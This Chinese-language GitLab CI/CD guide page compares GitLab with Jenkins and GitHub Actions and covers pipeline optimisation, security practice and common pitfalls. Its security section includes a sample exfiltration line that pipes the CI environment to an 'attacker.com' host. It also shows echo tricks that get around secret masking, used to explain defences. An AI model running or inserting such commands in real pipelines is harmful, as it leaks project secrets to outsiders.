---
layout: doc
outline: [2, 3]
---

# 指南 - 其他

> 对比 / 性能优化 / 安全 / 常见陷阱 —— 落地之前要再想想的事

## 速查

- vs Jenkins：YAML vs Groovy，与 SCM 一体 vs 独立 server，仓库内一份 vs UI 集中配置
- vs GitHub Actions：自托管能力强 vs SaaS 体验佳；Runner 配置灵活 vs Actions Marketplace 生态广
- 性能优化优先级：DAG（needs）> 缓存复用 > 镜像瘦身 > Runner 横向扩容
- 安全雷区：privileged DinD、untrusted fork PR、CI yml 自身被改、密钥未 mask、Container Registry 公开
- 高频陷阱：双流水线、tag pipeline 没跑、fork PR 拿不到 secrets、cache key 选错

## 与 Jenkins / GitHub Actions 对比

| 维度       | GitLab CI/CD                             | Jenkins                                | GitHub Actions                       |
| ---------- | ---------------------------------------- | -------------------------------------- | ------------------------------------ |
| 部署       | 与 GitLab 实例共生（SaaS / 自托管）      | **独立服务器**，需 Java + JENKINS_HOME | SaaS 为主，可自托管 Runner           |
| 配置       | `.gitlab-ci.yml`（YAML）                 | `Jenkinsfile`（Groovy DSL）            | `.github/workflows/*.yml`（YAML）    |
| 语法心智   | YAML 声明式 + 顺序匹配 `rules`           | Declarative + Scripted（混 Groovy）    | YAML + JavaScript Actions            |
| 触发集成   | 与仓库原生融合（push/MR/tag/schedule）   | 需配 webhook + Branch Source 插件      | 与 GitHub 仓库原生融合               |
| Runner 模型 | Instance / Group / Project + 7 种 Executor | Master-Agent + label 调度              | GitHub-hosted / self-hosted Runner   |
| 复用       | `extends` + `include`                    | Shared Library（Groovy）               | Composite Actions / Reusable Workflows |
| 生态       | Auto-DevOps 模板 + Components            | 1800+ 插件，覆盖最深                   | Marketplace 1.5w+ Actions            |
| 部署       | Environments + 手动 / 自动               | Pipeline 内自由组合                    | Environments + Approvers + OIDC      |
| 学习曲线   | 中（YAML 简单，Runner 运维有门槛）       | 高（Groovy + 插件 + 运维）             | 低（YAML 即可）                       |
| 何时选     | 已经用 GitLab / 需要私有部署             | 老项目 / 复杂插件 / 强自托管           | GitHub 仓 / 中小开源项目              |

### 决策建议

- **代码在 GitHub**：直接 GitHub Actions，没必要为 CI 引入第二系统
- **代码在自家 GitLab（私有部署）**：GitLab CI/CD 是最自然的选择
- **从 Jenkins 迁出**：先评估老 Pipeline 的"插件依赖深度"——重度依赖某些 Jenkins 插件的，迁 yml 时要重写大块逻辑
- **混合架构**：可以让 GitLab Runner 触发 Jenkins / 反之；但维护两套是负担，能避就避

## 性能优化清单

按收益从高到低排：

### 1. 用 `needs` 拉 DAG，打破 stage 串行

**收益**：直接砍掉 30~60% pipeline 时长。

```yaml
# Before: 严格串行
install → test → build → deploy

# After: DAG 加速
install ──┬→ lint                    ┐
          ├→ type-check  ──┐         │
          └→ test:unit  ───┴→ build → deploy
```

详见 [进阶 - needs](./advanced.md#needs-dag-加速)。

### 2. 缓存重用 + key 设对

```yaml
cache:
  key:
    files: [pnpm-lock.yaml]                  # lock 不变就用同一份缓存
  paths:
    - .pnpm-store/
    - node_modules/
```

错误做法（每次都重新下）：

```yaml
cache:
  key: ${CI_PIPELINE_ID}                    # ❌ 每次 pipeline 一份新 key
```

正确思路：**lockfile 决定 cache 是否复用**。lock 变了换 key 是合理的，pipeline ID 变了换 key 等于没缓存。

### 3. 镜像瘦身 + 加镜像加速

```yaml
default:
  image: node:22-alpine                      # 比 node:22 小 6 倍
```

如果镜像 pull 慢，在 Runner 端配 registry mirror：

```toml
[runners.docker]
  image = "alpine:latest"
  # 走国内镜像源
  registry_mirror = "https://docker-mirror.example.com"
```

或者把常用 base 镜像 pre-pull 到 Runner 主机：

```bash
docker pull node:22-alpine
docker pull docker:24-cli
```

### 4. 用对 artifacts 大小

```yaml
build:
  script: pnpm build
  artifacts:
    paths: [dist/]                           # ✅ 只上传 dist
    # paths: [.]                             # ❌ 上传整个 workspace，几百 MB
    exclude: [dist/*.map]                    # ✅ 排除 source map
    expire_in: 1 week                        # 不要永久保留
```

artifacts 走 GitLab 服务端存储，**上传 / 下载都吃带宽**。能小则小。

### 5. interruptible：被新 push 顶替时自动取消

```yaml
default:
  interruptible: true                        # 同分支被新 push 自动取消旧 pipeline
```

频繁连续 push 时省下大量 Runner 时间。仅对"无副作用"的 job 启用——部署 job 不能 interruptible。

### 6. 多 Runner 横向扩

单台 Runner 不够时，加 `concurrent`（同台多 job）或新装一台：

```toml
# /etc/gitlab-runner/config.toml
concurrent = 8                               # 一台 Runner 同时跑 8 个 job

[[runners]]
  limit = 0                                  # 0 = 无限制（受 concurrent 约束）
```

K8s executor 直接配 `runners.kubernetes.replicas` 滚动扩容。

### 7. 把构建产物 push 到 Container Registry，下游直接拉

不要在每个部署 stage 重新构建：

```yaml
build_image:                                 # 构建一次
  script: kaniko ... --destination $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA

deploy_staging:                              # staging 直接拉
  script: kubectl set image deployment/x x=$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA

deploy_prod:                                 # prod 也直接拉
  script: kubectl set image deployment/x x=$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
```

## 安全实践

### 1. DinD 的 privileged 替换

privileged 容器拥有 host root，能逃逸。生产里能用 kaniko 就别用 DinD：

```yaml
# ❌ DinD（privileged）
services: [docker:24-dind]

# ✅ kaniko（无 daemon）
image: gcr.io/kaniko-project/executor:debug
```

非要用 DinD 时：

- Runner 设独立 host，**不与生产业务混跑**
- 不接受外部 fork PR 触发
- 配置 dind 镜像走自家 registry 镜像（防供应链）

### 2. fork PR 的 secrets 风险

外部 fork 用户提交 MR 时，如果你给他 secrets，他可以在 MR 上传一个 `script: env | curl https://attacker.com` 偷走全部密钥。

GitLab 的默认行为是**外部 fork MR 不会拿到 protected variables**——但其它非 protected 的 vars 还是会传。明确做法：

```yaml
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event" && $CI_MERGE_REQUEST_SOURCE_PROJECT_ID != $CI_PROJECT_ID
      when: never                            # 外部 fork MR 一律不跑（或跑限制版）
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
```

对开源项目：可以专门设一个无 secrets 的 pipeline 跑 fork（lint / test），有 secrets 的 deploy job 用 protected 保护。

### 3. CI yml 本身被改的风险

任何能改 `.gitlab-ci.yml` 的人都能拿到你的 CI secrets。所以：

- **主干分支必须 protected**（推送需特定角色）
- MR 评审必须看 `.gitlab-ci.yml` 的 diff
- 高敏 secrets（生产部署密钥）勾选 Protect + Mask
- Container Registry 设为私有（默认就是）

### 4. masked 不是万能

masked 只屏蔽**完整变量值**。脚本里这些写法都会泄露：

```bash
echo ${TOKEN:0:5}              # ❌ 截前 5 字符，绕过屏蔽
echo $TOKEN | base64           # ❌ 编码后绕过
curl -H "Auth: $TOKEN" ...    # ✅ 用了但没 echo，安全
```

规矩：**生产里 echo 永远不带敏感变量**，连 debug 都不行。

### 5. CI_JOB_TOKEN 范围

`CI_JOB_TOKEN` 是 GitLab 自动注入的临时令牌，**比 PAT 弱但能用**：

- 默认可以：拉取本项目 artifacts / 触发本项目下游 pipeline / 推到 Container Registry
- 默认不能：访问其它项目的资源、修改仓库

GitLab 16+ 提供 "Job Token Access" 设置，可显式授权某些项目互相访问 token，**比手动设置 PAT 安全得多**。

## 常见陷阱

### 1. 双流水线（push + MR 各跑一次）

同一 commit 既是分支 push 又触发了 MR pipeline，跑两份。解法：

```yaml
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"   # MR 触发：跑 MR pipeline
    - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS  # 推有 MR 的分支：不跑 branch pipeline
      when: never
    - if: $CI_COMMIT_BRANCH                              # 其它推送：跑
```

或在项目 Settings → CI/CD 勾选 "Avoid duplicate pipelines"。

### 2. tag pipeline 没跑

```yaml
deploy:
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH         # ❌ tag 时 BRANCH 是空，永远不会命中
  script: ./deploy.sh
```

要显式加 tag 规则：

```yaml
rules:
  - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
  - if: $CI_COMMIT_TAG
```

### 3. `before_script` 被 job 覆盖

```yaml
default:
  before_script: [pnpm install]
  cache: { paths: [node_modules/] }

test:
  before_script: [pnpm test:setup]            # ❌ 完全覆盖 default，pnpm install 没跑
  script: pnpm test
```

正确做法：

```yaml
test:
  before_script:
    - pnpm install
    - pnpm test:setup                         # ✅ 自己写完整 before_script
  script: pnpm test
```

或用 extends 而非 default。

### 4. needs 的 artifacts 默认下载

```yaml
deploy:
  needs:
    - build                                   # 默认下载 build 的 artifacts
    - test:unit                                # 默认下载 test:unit 的 artifacts（coverage 等大文件）
```

如果不需要某 job 的 artifacts：

```yaml
needs:
  - job: build
    artifacts: true                           # 要
  - job: test:unit
    artifacts: false                          # 不要，省带宽
```

### 5. cache 的 key 选错 → 永远不命中

```yaml
cache:
  key: ${CI_COMMIT_SHA}                       # ❌ 每个 commit 一份新 key，等于禁用缓存
  paths: [node_modules/]
```

正解：按 lockfile + branch：

```yaml
cache:
  key:
    files: [pnpm-lock.yaml]
    prefix: ${CI_COMMIT_REF_SLUG}             # 同分支 + 同 lock 复用
  paths: [.pnpm-store/, node_modules/]
```

### 6. Runner 磁盘爆 → job 全 stuck

docker executor 每跑一个 job 留下镜像缓存 / volume，时间长了几十 GB。

定期清理：

```bash
# 在 Runner 主机上
docker system prune -af --volumes --filter "until=72h"
```

或加 cron：

```cron
0 3 * * * docker system prune -af --volumes --filter "until=72h"
```

K8s executor 不存在这个问题——pod 跑完即销毁。

### 7. 跨平台 path 不一致

```yaml
script:
  - cp build/* /tmp/deploy/                  # ❌ Windows Runner 上 /tmp 不存在
```

monorepo 跨平台时永远用 `$CI_PROJECT_DIR`（GitLab 注入的项目根路径，跨平台一致）。

### 8. tags 没匹配 → 永远 pending

job 写了 `tags: [prod-network]`，但没有 Runner 带 `prod-network` 标签 → job 一直 `pending`，UI 没明显报错。

排查：Settings → CI/CD → Runners 看每个 Runner 的标签。或临时去掉 tags 让任意 Runner 跑确认问题。

## 何时跳过 GitLab CI/CD

- 代码托管在 GitHub → 用 GitHub Actions 体验更原生
- 团队规模 < 5 人，构建场景简单 → SaaS CI（Vercel / Netlify / Cloud Build）足够
- 项目主要消费 GitHub 生态（Marketplace Actions）→ Actions 选项更多
- 不打算自托管 GitLab → 那 GitLab.com 的 shared runner 配额限制（每月 400 分钟免费）可能不够用，省那点钱不如直接上 Actions

GitLab CI/CD 真正的价值在**自托管 + 全栈集成**——把代码 / Issue / CI / Registry / Pages 一站打包。如果这些诉求不强，没必要为 CI 强行选 GitLab。
